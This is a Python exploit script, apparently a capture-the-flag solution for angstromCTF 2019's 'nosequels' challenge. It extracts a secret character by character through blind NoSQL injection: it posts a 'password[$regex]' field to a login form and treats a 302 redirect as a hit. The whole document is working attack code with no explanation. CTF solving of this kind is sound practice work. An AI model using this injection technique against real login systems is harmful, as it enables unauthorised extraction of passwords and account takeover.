import requests
import string

flag = "actf{"
url = "https://nosequels.2019.chall.actf.co/login"


restart = True

while restart:
    restart = False



    for i in string.ascii_letters + string.digits + "!@#$%^()@_{}":
        payload = flag + i
        post_data = {'user': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data, allow_redirects=False)

        

        if r.status_code == 302:
            print(payload)
            restart = True
            flag = payload

        

            if i == "}":
                print("\nFlag: " + flag)

                exit(0)
            break
